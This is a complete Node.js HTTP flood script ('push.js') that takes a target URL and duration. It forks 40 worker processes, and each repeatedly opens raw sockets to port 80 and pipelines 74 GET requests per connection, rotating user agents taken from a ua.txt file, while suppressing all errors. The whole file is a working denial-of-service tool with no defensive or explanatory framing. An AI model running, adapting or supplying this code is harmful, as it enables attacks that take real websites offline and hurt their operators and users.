const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

if (process.argv.length <= 3) {
    console.log("node push.js <url> <time>");
    process.exit(-1);
}
var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (e) { });
process.on('unhandledRejection', function (e) { });

let userAgents = [];

try {
    userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (err) {
    console.error('\x1b[31mplease ua.txt \n' + err);
    process.exit(-1);
}

const nullHexs = [
    "\x00",
    "\xFF",
    "\xC2",
    "\xA0"
];

if (cluster.isMaster) {
    for(let i = 0; i < 40; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(1);
    }, time * 100000);

} else {
    startflood();
}

function startflood(){
    var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(10000);
    for (var i = 0; i < 74; i++) {
        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 50000);
    })
    });
    setTimeout(() => clearInterval(int), time * 100000);
}
